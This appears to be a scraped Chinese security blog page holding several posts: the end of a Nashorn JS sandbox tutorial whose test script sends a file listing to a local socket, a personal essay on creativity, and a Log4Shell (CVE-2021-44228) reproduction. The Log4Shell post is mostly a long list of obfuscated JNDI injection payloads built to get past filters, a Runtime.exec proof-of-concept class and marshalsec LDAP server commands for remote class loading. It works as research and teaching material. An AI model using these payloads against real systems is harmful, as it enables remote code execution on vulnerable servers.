+<h3 id="5-2-自建ClassFilter"><a href="#5-2-自建ClassFilter" class="headerlink" title="5.2 自建ClassFilter"></a>5.2 自建ClassFilter</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line">public class EvalTest &#123;</span><br><span class="line"></span><br><span class="line">    public static void main(String[] args) throws ScriptException &#123;</span><br><span class="line"></span><br><span class="line">        String test3 = &quot;var a=mainOutput();function mainOutput()&#123;var file=new java.io.File(\&quot;/\&quot;);var fileLists=file.listFiles();var s=new java.net.Socket(\&quot;127.0.0.1\&quot;,8200);for(var i=0;i&lt;fileLists.length;i++)&#123;var out=s.getOutputStream();out.write(fileLists[i].getName().getBytes());out.write(\&quot;\\n\&quot;.getBytes());&#125;&#125;;&quot;;</span><br><span class="line"></span><br><span class="line">      //解析JS</span><br><span class="line">        NashornScriptEngineFactory factory = new NashornScriptEngineFactory();</span><br><span class="line"></span><br><span class="line">        ScriptEngine engine = factory.getScriptEngine(</span><br><span class="line">                new EvalTest.seClassFilterBlack());</span><br><span class="line">        engine.eval(test3);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    //黑名单方式</span><br><span class="line">    static class seClassFilterBlack implements ClassFilter&#123;</span><br><span class="line"></span><br><span class="line">        @Override</span><br><span class="line">        public boolean exposeToScripts(String s) &#123;</span><br><span class="line">            if (s.compareTo(&quot;java.io.File&quot;) == 0)</span><br><span class="line">                return false;</span><br><span class="line">            return true;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    //白名单方式</span><br><span class="line">    static class seClassFilterWhite implements ClassFilter&#123;</span><br><span class="line"></span><br><span class="line">        @Override</span><br><span class="line">        public boolean exposeToScripts(String s) &#123;</span><br><span class="line">            if (s.compareTo(&quot;java.io.File&quot;) == 0)</span><br><span class="line">                return true;</span><br><span class="line">            return false;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>可以看到File没有加载，执行失败<br>￼<br>￼<img lazyload src="/images/loading.svg" data-src="3.png"></p>
+
+                </div>
+
+                <div class="home-article-meta-info-container">
+    <div class="home-article-meta-info">
+        <span><i class="fas fa-history"></i>&nbsp;<span class="home-article-date" data-date="Fri Jan 28 2022 21:00:00 GMT+0800">2022-01-28</span></span>
+        
+            <span class="home-article-category"><i class="fas fa-folder"></i>&nbsp;
+                <ul>
+                    
+                        <li>
+                            
+                            <a href="/categories/JAVA%E5%AE%89%E5%85%A8/">JAVA安全</a>&nbsp;
+                        </li>
+                    
+                    
+                </ul>
+            </span>
+        
+        
+            <span class="home-article-tag">
+                <i class="fas fa-tags"></i>&nbsp;
+                <ul>
+                    
+                        <li>
+                            
+                            <a href="/tags/JAVA/">JAVA</a>&nbsp;
+                        </li>
+                    
+                </ul>
+            </span>
+        
+    </div>
+
+    <a href="/Java%20NashornJS%E5%BC%95%E6%93%8E%E4%BB%A3%E7%A0%81%E5%AE%89%E5%85%A8%E6%89%A7%E8%A1%8C/">Read more&nbsp;<i class="fas fa-angle-right"></i></a>
+</div>
+
+            </li>
+        
+            <li class="home-article-item">
+
+                
+
+                <h3 class="home-article-title">
+                    <a href="/%E5%88%9B%E9%80%A0%E5%92%8C%E7%83%AD%E7%88%B1/">
+                        创造与热爱
+                    </a>
+                </h3>
+
+                <!-- <div class="home-article-content markdown-body">
+                    
+                        
+
+今天早上在朋友圈看到TIM的一个视频《一个百大UP主的创业故事》，颇有感触和共鸣，视频放在这里了。
+
+
+
+
+
+
+
+
+
+巧的是，早上来的路上，也看到这么一段话，不由得思考，“什么样的事情才可以称之为艺术？”
+
+这个之前也想过多次，看完TIM视频后，对于这个答案更加具象了一些，趁着还没有忘记，简单写几笔。
+私以为，工作虽不分高低贵贱，但却有着一个明显的分界线，那便是“这份工作/这件事情”是否会对“自我/某个领域/社会/全人类”带来一点“创新/创造/突破/进步”，还是仅仅为了迎合大众的口味亦或日复一日的重复。
+中午吃烤肉的时候，和5xxxx、bxxxx聊起来。
+——“你知道B站老番茄吗？全B站排名第三，他的作品的意义在哪里呢？”——“做游戏视频的那个？B站上绝大部分观众都是为了kill time，搞笑剪辑题材和性感舞蹈题材一样播放量不低。”
+&lt;画家和酿酒师&gt; &lt;黑客与画家&gt;，在内核上，大致是相通的，从没有路的地方寻出一条路来，如果只是一味的模仿/追随/重复，那大致就只能平庸过一生了，即使骗过了所有人，也没法骗过自己内心。
+（截图摘自某位偶像）
+当然了，一切的前提还是要先活下去，在生存的基础上去追求生存质量。
+另一个让我比较有共鸣的点是——“热爱”。有次和c—喝酒的时候，我说我现在也不知道自己热爱的是什么了，好像一切都是三分钟热度，碌碌无为。在过去的这几年里，几乎没有什么事情让我长时间进入心流状态了，彷佛做的一切只是为了谋生。
+周日在家中写了一下午的代码，无比沉浸，在看到预期输出的那一瞬，酣畅淋漓，彷佛多年之前彻夜不眠的自己又回来了。
+似乎自己喜欢的更多的是“创造”的过程，从0到1、从无到有，能够让自己进入心流模式，拍/剪视频的时候也会有这种感觉，一堆杂乱的素材通过各种转场、衔接，变成一个故事，类似的事情仔细想想竟也有不少，时间在此时已不是一个过程，而是一个状态。（难道是多巴胺的分泌？）
+
+
+
+
+有一个离职创业的朋友，每次在一起聚会的时候，听他讲起自己的事业、通宵coding的时候，似乎能从他眼中看到光。
+（题外话：一直以为眼里有光是个形容词，后来才知道，其实是一个生理反应，泪水的反光）
+
+我很羡慕，他能拥有自己的热爱、拥有逐梦的勇气。放弃薪水和稳定去与命运搏一线生机，即使失败又如何呢！
+
+
+（http://paulgraham.com/newideas.html）
+草草写下此文，大概只是说明了自己是个普通人吧。
+但是会永远这样吗？不知道。
+文末推荐一个优质的blog，《黑客与画家》的作者http://paulgraham.com/articles.html
+
+                    
+                </div> -->
+                <div class="article-content markdown-body">
+                    <blockquote>
+<blockquote>
+<p>今天早上在朋友圈看到TIM的一个视频《一个百大UP主的创业故事》，颇有感触和共鸣，视频放在这里了。</p>
+</blockquote>
+</blockquote>
+
+<div style="position: relative; width: 100%; height: 0; padding-bottom: 75%;">
+<iframe src="//player.bilibili.com/player.html?aid=629328863&bvid=BV1Bb4y1R7WQ&cid=299458113&page=1" scrolling="no" border="0" frameborder="no" framespacing="0" allowfullscreen="true" style="position: absolute; width: 100%; height: 100%; Left: 0; top: 0;"></iframe></div>
+
+
+
+
+<p>巧的是，早上来的路上，也看到这么一段话，不由得思考，<strong>“什么样的事情才可以称之为艺术？”</strong></p>
+<p><img lazyload src="/images/loading.svg" data-src="%E6%91%98%E5%BD%95%E4%BA%8E20211220.jpeg"></p>
+<p>这个之前也想过多次，看完TIM视频后，对于这个答案更加具象了一些，趁着还没有忘记，简单写几笔。</p>
+<p>私以为，工作虽不分高低贵贱，但却有着一个明显的分界线，那便是<strong>“这份工作/这件事情”是否会对“自我/某个领域/社会/全人类”带来一点“创新/创造/突破/进步”，还是仅仅为了迎合大众的口味亦或日复一日的重复</strong>。</p>
+<p>中午吃烤肉的时候，和5xxxx、bxxxx聊起来。</p>
+<p>——“你知道B站老番茄吗？全B站排名第三，他的作品的意义在哪里呢？”<br>——“做游戏视频的那个？B站上绝大部分观众都是为了kill time，搞笑剪辑题材和性感舞蹈题材一样播放量不低。”</p>
+<p>&lt;画家和酿酒师&gt; &lt;黑客与画家&gt;，在内核上，大致是相通的，从没有路的地方寻出一条路来，如果只是一味的模仿/追随/重复，那大致就只能平庸过一生了，即使骗过了所有人，也没法骗过自己内心。</p>
+<p><img lazyload src="/images/loading.svg" data-src="zhuzhuxia.png"><br>（截图摘自某位偶像）</p>
+<p>当然了，一切的前提还是要先活下去，在生存的基础上去追求生存质量。</p>
+<p>另一个让我比较有共鸣的点是——“热爱”。有次和c—喝酒的时候，我说我现在也不知道自己热爱的是什么了，好像一切都是三分钟热度，碌碌无为。在过去的这几年里，几乎没有什么事情让我长时间进入心流状态了，彷佛做的一切只是为了谋生。</p>
+<p>周日在家中写了一下午的代码，无比沉浸，在看到预期输出的那一瞬，酣畅淋漓，彷佛多年之前彻夜不眠的自己又回来了。</p>
+<p>似乎自己喜欢的更多的是“创造”的过程，从0到1、从无到有，能够让自己进入心流模式，拍/剪视频的时候也会有这种感觉，一堆杂乱的素材通过各种转场、衔接，变成一个故事，类似的事情仔细想想竟也有不少，时间在此时已不是一个过程，而是一个状态。（难道是多巴胺的分泌？）</p>
+<p><img lazyload src="/images/loading.svg" data-src="1.png"></p>
+<p><img lazyload src="/images/loading.svg" data-src="2.png"></p>
+<p><img lazyload src="/images/loading.svg" data-src="3.png"></p>
+<p><img lazyload src="/images/loading.svg" data-src="4.png"></p>
+<p>有一个离职创业的朋友，每次在一起聚会的时候，听他讲起自己的事业、通宵coding的时候，似乎能从他眼中看到光。</p>
+<p>（题外话：一直以为眼里有光是个形容词，后来才知道，其实是一个生理反应，泪水的反光）</p>
+<p><img lazyload src="/images/loading.svg" data-src="xue1.png"></p>
+<p>我很羡慕，他能拥有自己的热爱、拥有逐梦的勇气。放弃薪水和稳定去与命运搏一线生机，即使失败又如何呢！</p>
+<p><img lazyload src="/images/loading.svg" data-src="xue2.png"></p>
+<p><img lazyload src="/images/loading.svg" data-src="CRAZYNEWIDEAS.png"></p>
+<p>（<a class="link" target="_blank" rel="noopener" href="http://paulgraham.com/newideas.html%EF%BC%89">http://paulgraham.com/newideas.html）<i class="fas fa-external-link-alt"></i></a></p>
+<p>草草写下此文，大概只是说明了自己是个普通人吧。</p>
+<p>但是会永远这样吗？不知道。</p>
+<p>文末推荐一个优质的blog，《黑客与画家》的作者<br><a class="link" target="_blank" rel="noopener" href="http://paulgraham.com/articles.html">http://paulgraham.com/articles.html<i class="fas fa-external-link-alt"></i></a></p>
+
+                </div>
+
+                <div class="home-article-meta-info-container">
+    <div class="home-article-meta-info">
+        <span><i class="fas fa-history"></i>&nbsp;<span class="home-article-date" data-date="Mon Dec 20 2021 20:00:00 GMT+0800">2021-12-20</span></span>
+        
+            <span class="home-article-category"><i class="fas fa-folder"></i>&nbsp;
+                <ul>
+                    
+                        <li>
+                            
+                            <a href="/categories/%E8%83%A1%E6%80%9D%E4%B9%B1%E6%83%B3/">胡思乱想</a>&nbsp;
+                        </li>
+                    
+                    
+                </ul>
+            </span>
+        
+        
+            <span class="home-article-tag">
+                <i class="fas fa-tags"></i>&nbsp;
+                <ul>
+                    
+                        <li>
+                            
+                            <a href="/tags/THINK/">THINK</a>&nbsp;
+                        </li>
+                    
+                </ul>
+            </span>
+        
+    </div>
+
+    <a href="/%E5%88%9B%E9%80%A0%E5%92%8C%E7%83%AD%E7%88%B1/">Read more&nbsp;<i class="fas fa-angle-right"></i></a>
+</div>
+
+            </li>
+        
+            <li class="home-article-item">
+
+                
+
+                <h3 class="home-article-title">
+                    <a href="/CVE-2021-44228%20Log4Shell/">
+                        CVE-2021-44228 Log4Shell
+                    </a>
+                </h3>
+
+                <!-- <div class="home-article-content markdown-body">
+                    
+                        2021年12月9日晚上，Log4j2 JNDI注入漏洞详情被公开。漏洞发现过程：通过公开的CodeQL规则扫描出来的漏洞。漏洞编号：CVE-2021-44228。影响范围：Apache Log4j 2.x &lt;= 2.15.0-rc1。
+12345678910import org.apache.logging.log4j.LogManager;import org.apache.logging.log4j.Logger;public class log4j &#123;    private static final Logger logger = LogManager.getLogger(log4j.class);    public static void main(String[] args) &#123;        logger.error(&quot;$&#123;jndi:ldap://127.0.0.1:1389/a&#125;&quot;);    &#125;&#125;
+
+Log4j2会解析${}，读取出其中的内容。判断其是否为Ldap实现的JNDI，于是调用Java底层的Lookup方法，尝试完成Ldap的Lookup操作。
+JNDIJNDI全称 Java Naming and Directory Interface。JNDI是Java平台的一个标准扩展，提供了一组接口、类和关于命名空间的概念。如同其它很多Java技术一样，JDNI是provider-based的技术，暴露了一个API和一个服务供应接口（SPI）。这意味着任何基于名字的技术都能通过JNDI而提供服务，只要JNDI支持这项技术。JNDI目前所支持的技术包括LDAP、CORBA Common Object Service（COS）名字服务、RMI、NDS、DNS、Windows注册表等等。很多J2EE技术，包括EJB都依靠JNDI来组织和定位实体。
+JDNI通过绑定的概念将对象和名称联系起来。在一个文件系统中，文件名被绑定给文件。在DNS中，一个IP地址绑定一个URL。在目录服务中，一个对象名被绑定给一个对象实体。
+JNDI中的一组绑定作为上下文来引用。每个上下文暴露的一组操作是一致的。例如，每个上下文提供了一个查找操作，返回指定名字的相应对象。每个上下文都提供了绑定和撤除绑定名字到某个对象的操作。JNDI使用通用的方式来暴露命名空间，即使用分层上下文以及使用相同命名语法的子上下文。（copy自网络）
+LDAPLDAP目录服务是一个特殊的数据库，用来保存描述性的、基于属性的详细信息，支持过滤功能。
+LDAP（Light Directory Access Portocol），它是基于X.500标准的轻量级目录访问协议。
+目录是一个为查询、浏览和搜索而优化的数据库，它成树状结构组织数据，类似文件目录一样。
+目录数据库和关系数据库不同，它有优异的读性能，但写性能差，并且没有事务处理、回滚等复杂功能，不适于存储修改频繁的数据。所以目录天生是用来查询的，就好象它的名字一样。
+LDAP目录服务是由目录数据库和一套访问协议组成的系统。（copy自网络）
+Payload123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475$&#123;jndi:ldap://127.0.0.1/poc&#125;$&#123;jndi:rmi://127.0.0.1/poc&#125;$&#123;jndi:dns://127.0.0.1/poc&#125;$&#123;$&#123;::-j&#125;$&#123;::-n&#125;$&#123;::-d&#125;$&#123;::-i&#125;:$&#123;::-r&#125;$&#123;::-m&#125;$&#123;::-i&#125;://127.0.0.1/poc&#125;$&#123;$&#123;::-j&#125;ndi:rmi://127.0.0.1/poc&#125;$&#123;$&#123;lower:jndi&#125;:$&#123;lower:rmi&#125;://127.0.0.1/poc&#125;$&#123;$&#123;lower:$&#123;lower:jndi&#125;&#125;:$&#123;lower:rmi&#125;://127.0.0.1/poc&#125;$&#123;$&#123;lower:j&#125;$&#123;lower:n&#125;$&#123;lower:d&#125;i:$&#123;lower:rmi&#125;://127.0.0.1/poc&#125;$&#123;$&#123;lower:j&#125;$&#123;upper:n&#125;$&#123;lower:d&#125;$&#123;upper:i&#125;:$&#123;lower:r&#125;m$&#123;lower:i&#125;&#125;://127.0.0.1/poc&#125;$&#123;jndi:$&#123;lower:l&#125;$&#123;lower:d&#125;$&#123;lower:a&#125;$&#123;lower:p&#125;&#125;://127.0.0.1/poc&#125;$&#123;$&#123;::-j&#125;$&#123;::-n&#125;$&#123;::-d&#125;$&#123;::-i&#125;:$&#123;::-l&#125;$&#123;::-d&#125;$&#123;::-a&#125;$&#123;::-p&#125;://127.0.0.1/poc&#125;$%7Bjndi:ldap://127.0.0.1/poc%7D$&#123;$&#123;env:ENV_NAME:-j&#125;ndi$&#123;env:ENV_NAME:-:&#125;$&#123;env:ENV_NAME:-l&#125;dap$&#123;env:ENV_NAME:-:&#125;127.0.0.1/poc&#125;$&#123;jndi:$&#123;lower:l&#125;$&#123;lower:d&#125;$&#123;lower:a&#125;$&#123;lower:p&#125;://127.0.0.1/poc&#125;$&#123;jndi:$&#123;lower:l&#125;$&#123;lower:d&#125;a$&#123;lower:p&#125;://127.0.0.1/poc&#125;$&#123;$&#123;lower:j&#125;ndi:$&#123;lower:l&#125;$&#123;lower:d&#125;a$&#123;lower:p&#125;://127.0.0.1/poc&#125;$&#123;$&#123;env:TEST:-j&#125;ndi$&#123;env:TEST:-:&#125;$&#123;env:TEST:-l&#125;dap$&#123;env:TEST:-:&#125;127.0.0.1/poc&#125;$&#123;jndi:$&#123;lower:l&#125;$&#123;lower:d&#125;ap://127.0.0.1/poc&#125;$&#123;jndi:ldap://127.0.0.1#127.0.0.1/poc&#125;$&#123;$&#123;::-j&#125;$&#123;::-n&#125;$&#123;::-d&#125;$&#123;::-i&#125;:$&#123;::-r&#125;$&#123;::-m&#125;$&#123;::-i&#125;://k123.k123.k123/poc&#125;$&#123;$&#123;::-j&#125;ndi:rmi://k123.k123.k123/ass&#125;$&#123;jndi:rmi://k8.k123.k123&#125;$&#123;$&#123;lower:jndi&#125;:$&#123;lower:rmi&#125;://k8.k123.k123/poc&#125;$&#123;$&#123;lower:$&#123;lower:jndi&#125;&#125;:$&#123;lower:rmi&#125;://k8.k123.k123/poc&#125;$&#123;$&#123;lower:j&#125;$&#123;lower:n&#125;$&#123;lower:d&#125;i:$&#123;lower:rmi&#125;://k8.k123.k123/poc&#125;j$&#123;loWer:Nd&#125;i$&#123;uPper::&#125;$&#123;jndi:ldaps://127.0.0.1/poc&#125;$&#123;jndi:iiop://127.0.0.1/poc&#125;$&#123;date:ldap://127.0.0.1/poc&#125;$&#123;java:ldap://127.0.0.1/poc&#125;$&#123;marker:ldap://127.0.0.1/poc&#125;$&#123;ctx:ldap://127.0.0.1/poc&#125;$&#123;lower:ldap://127.0.0.1/poc&#125;$&#123;upper:ldap://127.0.0.1/poc&#125;$&#123;main:ldap://127.0.0.1/poc&#125;$&#123;jvmrunargs:ldap://127.0.0.1/poc&#125;$&#123;sys:ldap://127.0.0.1/poc&#125;$&#123;env:ldap://127.0.0.1/poc&#125;$&#123;log4j:ldap://127.0.0.1/poc&#125;$&#123;j$&#123;k8s:k5:-ND&#125;i$&#123;sd:k5:-:&#125;$&#123;lower:l&#125;d$&#123;lower:a&#125;$&#123;lower:p&#125;://$&#123;hostName&#125;.&#123;&#123;interactsh-url&#125;&#125;&#125;$&#123;jndi:rmi://127.0.0.1&#125;/$&#123;jnd$&#123;123%25ff:-$&#123;123%25ff:-i:&#125;&#125;ldap://127.0.0.1/poc&#125;$&#123;jndi:dns://127.0.0.1&#125;$&#123;j$&#123;k8s:k5:-ND&#125;i:ldap://127.0.0.1/poc&#125;$&#123;j$&#123;k8s:k5:-ND&#125;i:ldap$&#123;sd:k5:-:&#125;//127.0.0.1/poc&#125;$&#123;j$&#123;k8s:k5:-ND&#125;i$&#123;sd:k5:-:&#125;ldap://127.0.0.1/poc&#125;$&#123;j$&#123;k8s:k5:-ND&#125;i$&#123;sd:k5:-:&#125;ldap$&#123;sd:k5:-:&#125;//127.0.0.1/poc&#125;$&#123;$&#123;k8s:k5:-J&#125;$&#123;k8s:k5:-ND&#125;i$&#123;sd:k5:-:&#125;ldap://127.0.0.1/poc&#125;$&#123;$&#123;k8s:k5:-J&#125;$&#123;k8s:k5:-ND&#125;i$&#123;sd:k5:-:&#125;ldap&#123;sd:k5:-:&#125;//127.0.0.1/poc&#125;$&#123;$&#123;k8s:k5:-J&#125;$&#123;k8s:k5:-ND&#125;i$&#123;sd:k5:-:&#125;l$&#123;lower:D&#125;ap$&#123;sd:k5:-:&#125;//127.0.0.1/poc&#125;$&#123;j$&#123;k8s:k5:-ND&#125;i$&#123;sd:k5:-:&#125;$&#123;lower:L&#125;dap$&#123;sd:k5:-:&#125;//127.0.0.1/poc$&#123;$&#123;k8s:k5:-J&#125;$&#123;k8s:k5:-ND&#125;i$&#123;sd:k5:-:&#125;l$&#123;lower:D&#125;a$&#123;::-p&#125;$&#123;sd:k5:-:&#125;//127.0.0.1/poc&#125;$&#123;jndi:$&#123;lower:l&#125;$&#123;lower:d&#125;a$&#123;lower:p&#125;://127.0.0.1&#125;$&#123;jnd$&#123;upper:i&#125;:ldap://127.0.0.1/poc&#125;$&#123;j$&#123;$&#123;:-l&#125;$&#123;:-o&#125;$&#123;:-w&#125;$&#123;:-e&#125;$&#123;:-r&#125;:n&#125;di:ldap://127.0.0.1/poc&#125;$&#123;jndi:ldap://127.0.0.1#127.0.0.1:1389/poc&#125;$&#123;$&#123;::-j&#125;$&#123;::-n&#125;$&#123;::-d&#125;$&#123;::-i&#125;:$&#123;::-l&#125;$&#123;::-d&#125;$&#123;::-a&#125;$&#123;::-p&#125;://127.0.0.1/poc&#125;$&#123;$&#123;::-j&#125;$&#123;::-n&#125;$&#123;::-d&#125;$&#123;::-i&#125;:$&#123;::-r&#125;$&#123;::-m&#125;$&#123;::-i&#125;://127.0.0.1/poc&#125;$&#123;$&#123;lower:jndi&#125;:$&#123;lower:ldap&#125;://127.0.0.1/poc&#125;$&#123;$&#123;::-j&#125;ndi:rmi://127.0.0.1/poc&#125;$&#123;$&#123;lower:$&#123;lower:jndi&#125;&#125;:$&#123;lower:ldap&#125;://127.0.0.1/poc&#125;$&#123;$&#123;lower:jndi&#125;:$&#123;lower:rmi&#125;://127.0.0.1/poc&#125;$&#123;$&#123;lower:j&#125;$&#123;lower:n&#125;$&#123;lower:d&#125;i:$&#123;lower:ldap&#125;://127.0.0.1/poc&#125;$&#123;$&#123;lower:$&#123;lower:jndi&#125;&#125;:$&#123;lower:rmi&#125;://127.0.0.1/poc&#125;$&#123;$&#123;lower:j&#125;$&#123;upper:n&#125;$&#123;lower:d&#125;$&#123;upper:i&#125;:$&#123;lower:l&#125;d$&#123;lower:a&#125;p://127.0.0.1/poc&#125;$&#123;$&#123;lower:j&#125;$&#123;upper:n&#125;$&#123;lower:d&#125;$&#123;upper:i&#125;:$&#123;lower:r&#125;m$&#123;lower:i&#125;://127.0.0.1/poc&#125;$&#123;j$&#123;env:DOESNOTEXIST:-&#125;ndi:ldap://127.0.0.1/poc&#125;$&#123;j$&#123;env:DOESNOTEXIST:-&#125;ndi:rmi://127.0.0.1/poc&#125;$&#123;$&#123;: : : : ::: :: :: : :::-j&#125;ndi:ldap://127.0.0.1/poc&#125;$&#123;$&#123;: : : : ::: :: :: : :::-j&#125;ndi:rmi://127.0.0.1/poc&#125;$&#123;$&#123;::::::::::::::-j&#125;ndi:ldap://127.0.0.1/poc&#125;$&#123;$&#123;::::::::::::::-j&#125;ndi:rmi://127.0.0.1/poc&#125;$&#123;$&#123;::-j&#125;$&#123;::-n&#125;$&#123;::-d&#125;$&#123;::-i&#125;:$&#123;::-l&#125;$&#123;::-d&#125;$&#123;::-a&#125;$&#123;::-p&#125;://127.0.0.1/poc&#125;（copy自网络）
+
+漏洞复现创建LDAPRefServer
+poc：
+123456789101112131415public class Poc &#123;    public Poc() &#123;        try&#123;            String[] cmd = &#123;&quot;open&quot;, &quot;/System/Applications/Calculator.app&quot;&#125;;            Process process = Runtime.getRuntime().exec(cmd);            process.waitFor();        &#125;catch (Exception e)&#123;            e.printStackTrace();        &#125;    &#125;    public static void main(String[] args) &#123;        Poc poc = new Poc();    &#125;&#125;
+
+ 1python3 -m http.server 8200
+
+1java marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer &quot;http://127.0.0.1:8200/#Poc&quot; 
+
+执行
+12345678910111213package net.uxss.log4j2;import org.apache.logging.log4j.*;public class Log4j2Test &#123;    private static final Logger logger = LogManager.getLogger(Log4j2Test.class);    public static void main(String[] args) &#123;        logger.error(&quot;$&#123;jndi:ldap://127.0.0.1:1389/Poc&#125;&quot;);    &#125;&#125;
+
+
+
+                    
+                </div> -->
+                <div class="article-content markdown-body">
+                    <p>2021年12月9日晚上，Log4j2 JNDI注入漏洞详情被公开。漏洞发现过程：通过公开的CodeQL规则扫描出来的漏洞。漏洞编号：CVE-2021-44228。影响范围：Apache Log4j 2.x &lt;= 2.15.0-rc1。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">import org.apache.logging.log4j.LogManager;</span><br><span class="line">import org.apache.logging.log4j.Logger;</span><br><span class="line"></span><br><span class="line">public class log4j &#123;</span><br><span class="line">    private static final Logger logger = LogManager.getLogger(log4j.class);</span><br><span class="line"></span><br><span class="line">    public static void main(String[] args) &#123;</span><br><span class="line">        logger.error(&quot;$&#123;jndi:ldap://127.0.0.1:1389/a&#125;&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>Log4j2会解析${}，读取出其中的内容。判断其是否为Ldap实现的JNDI，于是调用Java底层的Lookup方法，尝试完成Ldap的Lookup操作。</p>
+<h2 id="JNDI"><a href="#JNDI" class="headerlink" title="JNDI"></a>JNDI</h2><p>JNDI全称 Java Naming and Directory Interface。JNDI是Java平台的一个标准扩展，提供了一组接口、类和关于命名空间的概念。如同其它很多Java技术一样，JDNI是provider-based的技术，暴露了一个API和一个服务供应接口（SPI）。这意味着任何基于名字的技术都能通过JNDI而提供服务，只要JNDI支持这项技术。JNDI目前所支持的技术包括LDAP、CORBA Common Object Service（COS）名字服务、RMI、NDS、DNS、Windows注册表等等。很多J2EE技术，包括EJB都依靠JNDI来组织和定位实体。</p>
+<p>JDNI通过绑定的概念将对象和名称联系起来。在一个文件系统中，文件名被绑定给文件。在DNS中，一个IP地址绑定一个URL。在目录服务中，一个对象名被绑定给一个对象实体。</p>
+<p>JNDI中的一组绑定作为上下文来引用。每个上下文暴露的一组操作是一致的。例如，每个上下文提供了一个查找操作，返回指定名字的相应对象。每个上下文都提供了绑定和撤除绑定名字到某个对象的操作。JNDI使用通用的方式来暴露命名空间，即使用分层上下文以及使用相同命名语法的子上下文。（copy自网络）</p>
+<h2 id="LDAP"><a href="#LDAP" class="headerlink" title="LDAP"></a>LDAP</h2><p>LDAP目录服务是一个特殊的数据库，用来保存描述性的、基于属性的详细信息，支持过滤功能。</p>
+<p>LDAP（Light Directory Access Portocol），它是基于X.500标准的轻量级目录访问协议。</p>
+<p>目录是一个为查询、浏览和搜索而优化的数据库，它成树状结构组织数据，类似文件目录一样。</p>
+<p>目录数据库和关系数据库不同，它有优异的读性能，但写性能差，并且没有事务处理、回滚等复杂功能，不适于存储修改频繁的数据。所以目录天生是用来查询的，就好象它的名字一样。</p>
+<p>LDAP目录服务是由目录数据库和一套访问协议组成的系统。（copy自网络）</p>
+<h2 id="Payload"><a href="#Payload" class="headerlink" title="Payload"></a>Payload</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br></pre></td><td class="code"><pre><span class="line">$&#123;jndi:ldap://127.0.0.1/poc&#125;</span><br><span class="line">$&#123;jndi:rmi://127.0.0.1/poc&#125;</span><br><span class="line">$&#123;jndi:dns://127.0.0.1/poc&#125;</span><br><span class="line">$&#123;$&#123;::-j&#125;$&#123;::-n&#125;$&#123;::-d&#125;$&#123;::-i&#125;:$&#123;::-r&#125;$&#123;::-m&#125;$&#123;::-i&#125;://127.0.0.1/poc&#125;</span><br><span class="line">$&#123;$&#123;::-j&#125;ndi:rmi://127.0.0.1/poc&#125;</span><br><span class="line">$&#123;$&#123;lower:jndi&#125;:$&#123;lower:rmi&#125;://127.0.0.1/poc&#125;</span><br><span class="line">$&#123;$&#123;lower:$&#123;lower:jndi&#125;&#125;:$&#123;lower:rmi&#125;://127.0.0.1/poc&#125;</span><br><span class="line">$&#123;$&#123;lower:j&#125;$&#123;lower:n&#125;$&#123;lower:d&#125;i:$&#123;lower:rmi&#125;://127.0.0.1/poc&#125;</span><br><span class="line">$&#123;$&#123;lower:j&#125;$&#123;upper:n&#125;$&#123;lower:d&#125;$&#123;upper:i&#125;:$&#123;lower:r&#125;m$&#123;lower:i&#125;&#125;://127.0.0.1/poc&#125;</span><br><span 